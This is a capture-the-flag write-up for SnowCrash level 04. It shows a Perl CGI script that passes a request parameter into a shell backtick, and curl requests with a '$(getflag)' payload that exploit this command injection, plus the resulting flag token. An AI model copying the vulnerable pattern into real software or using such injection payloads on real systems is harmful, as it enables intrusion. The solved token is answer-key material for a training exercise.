## Level 04

`ls` -> we find a level04.pl (perl script)

Here's the content:

``` perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Curl request

It seems we can send curl requests to the server and it will execute the `x` subroutine as this:

`curl -s -X POST -d 'x="salut mec comment ça va"' localhost:4747`

It will shoot us with;

```bash
level04@SnowCrash:~$ curl -s -X POST -d 'x="salut mec comment ça va"' localhost:4747
salut mec comment ça va
```

So we can use echo to execute commands inside the server such as:
```bash
level04@SnowCrash:~$ curl -s -X POST -d 'x="$(getflag)"' localhost:4747
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Token

ne2searoevaevoem4ov4ar8ap